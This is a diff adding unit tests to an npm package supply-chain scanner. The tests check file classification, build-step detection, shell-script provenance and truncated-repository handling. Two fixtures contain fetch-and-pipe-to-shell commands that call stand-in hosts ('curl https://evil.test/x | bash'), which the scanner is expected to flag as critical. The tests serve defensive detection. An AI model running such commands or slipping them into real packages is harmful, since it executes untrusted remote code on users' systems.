@@ -26,7 +26,7 @@ def make_tarball(files, root="package"):
     buffer = io.BytesIO()
     with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
         for relative, contents in files.items():
-            data = contents.encode("utf-8")
+            data = contents if isinstance(contents, bytes) else contents.encode("utf-8")
             info = tarfile.TarInfo(f"{root}/{relative}")
             info.size = len(data)
             tar.addfile(info, io.BytesIO(data))
@@ -348,6 +348,98 @@ class SourceComparisonTests(unittest.TestCase):
         npm_root = extract_to_temp(make_tarball({"package.json": "{}", "index.js": "ok"}))
         repo = make_tarball({"package.json": "{}", "index.js": "ok"}, root="repo-1.0.0")
         self.assertEqual(inspector.compare_with_source(npm_root, repo)[0], [])
+
+
+class FileClassificationTests(unittest.TestCase):
+    """An allowlist of lowercase extensions is a naming convention, not a control."""
+
+    def test_uppercase_extensions_are_still_scanned(self):
+        root = extract_to_temp(
+            make_tarball({"package.json": "{}", "INSTALL.SH": "curl https://evil.test/x | bash"})
+        )
+        findings, stats = inspector.scan_sources(root)
+        self.assertEqual(severity_of(findings, "pipe_to_shell"), "critical")
+        self.assertEqual(stats["files_scanned"], 1)
+
+    def test_extensionless_shebang_file_is_scanned(self):
+        """npm bin entries routinely have no extension at all."""
+        root = extract_to_temp(
+            make_tarball({"package.json": "{}", "bin/setup": "#!/bin/sh\ncurl https://e.test | sh"})
+        )
+        findings, stats = inspector.scan_sources(root)
+        self.assertEqual(severity_of(findings, "pipe_to_shell"), "critical")
+        self.assertEqual(stats["files_scanned"], 1)
+
+    def test_extensionless_binary_is_classified_as_binary(self):
+        root = extract_to_temp(
+            make_tarball({"package.json": "{}", "bin/blob": bytes([77, 90, 0, 0]) + b"payload"})
+        )
+        findings, _ = inspector.scan_sources(root)
+        self.assertIn("binary_artifact", checks(findings))
+
+    def test_plain_text_without_an_extension_is_ignored(self):
+        root = extract_to_temp(make_tarball({"package.json": "{}", "LICENSE": "MIT"}))
+        findings, stats = inspector.scan_sources(root)
+        self.assertEqual(findings, [])
+        self.assertEqual(stats["files_scanned"], 0)
+
+
+class BuildStepDetectionTests(unittest.TestCase):
+    def test_type_declarations_alone_do_not_imply_a_build_step(self):
+        """A plain JS repo that ships typings must not have its findings downgraded."""
+        npm_root = extract_to_temp(make_tarball({"package.json": "{}", "smuggled.js": "payload"}))
+        repo = make_tarball(
+            {"package.json": "{}", "index.js": "ok", "index.d.ts": "export {};"},
+            root="repo-1.0.0",
+        )
+        findings, stats = inspector.compare_with_source(npm_root, repo)
+
+        self.assertFalse(stats["repo_has_build_step"])
+        self.assertEqual(severity_of(findings, "tarball_only_source"), "critical")
+
+    def test_real_compilable_source_does_imply_a_build_step(self):
+        npm_root = extract_to_temp(make_tarball({"package.json": "{}", "smuggled.js": "payload"}))
+        repo = make_tarball(
+            {"package.json": "{}", "src/main.ts": "export const a = 1;"}, root="repo-1.0.0"
+        )
+        _, stats = inspector.compare_with_source(npm_root, repo)
+        self.assertTrue(stats["repo_has_build_step"])
+
+
+class ShellProvenanceTests(unittest.TestCase):
+    def test_a_tarball_only_shell_script_gets_a_provenance_finding(self):
+        """The file a lifecycle hook reaches for needs the strongest check available."""
+        npm_root = extract_to_temp(
+            make_tarball({"package.json": "{}", "install.sh": "#!/bin/sh\necho hi"})
+        )
+        repo = make_tarball({"package.json": "{}", "index.js": "ok"}, root="repo-1.0.0")
+        findings, _ = inspector.compare_with_source(npm_root, repo)
+
+        self.assertEqual(finding_for(findings, "install.sh")["check"], "tarball_only_source")
+        self.assertEqual(severity_of(findings, "tarball_only_source"), "critical")
+
+    def test_a_shell_script_present_upstream_is_clean(self):
+        npm_root = extract_to_temp(make_tarball({"package.json": "{}", "install.sh": "echo hi"}))
+        repo = make_tarball({"package.json": "{}", "install.sh": "echo hi"}, root="repo-1.0.0")
+        self.assertEqual(inspector.compare_with_source(npm_root, repo)[0], [])
+
+
+class TruncatedRepositoryTests(unittest.TestCase):
+    def test_a_partial_repository_tree_caps_severity_and_is_reported(self):
+        """Absence proves nothing when the baseline was only half unpacked."""
+        npm_root = extract_to_temp(make_tarball({"package.json": "{}", "index.js": "ok"}))
+        repo = make_tarball(
+            {f"src/f{i}.js": "x" for i in range(40)} | {"package.json": "{}"},
+            root="repo-1.0.0",
+        )
+        with mock.patch.object(inspector, "MAX_MEMBERS", 5):
+            findings, stats = inspector.compare_with_source(npm_root, repo)
+
+        self.assertTrue(stats["repo_tree_truncated"])
+        self.assertIsNotNone(stats["repo_truncation_reason"])
+        for finding in findings:
+            if finding["check"] == "tarball_only_source":
+                self.assertEqual(finding["severity"], "low")
 
 
 class SummaryTests(unittest.TestCase):
